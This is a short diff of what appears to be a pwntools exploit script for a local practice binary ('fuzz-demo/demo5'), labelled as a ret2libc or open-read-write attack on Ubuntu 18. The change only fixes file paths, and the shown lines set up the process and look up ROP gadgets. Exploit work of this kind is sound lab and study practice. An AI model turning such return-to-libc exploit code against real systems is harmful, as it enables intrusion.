@@ -3,9 +3,9 @@
 #ubuntu-18 ret2libc system or orw
 from pwn import *
 context(log_level='debug',arch='amd64')
-elf=ELF('./fuzz-demo/demo5')
+elf=ELF('../fuzz-demo/demo5')
 libc=elf.libc
-r=process('./fuzz-demo/demo5')
+r=process('../fuzz-demo/demo5')
 r.recv(timeout=1)
 rdi=0x400883
 rdx=next(libc.search(asm('pop rdx;ret')))
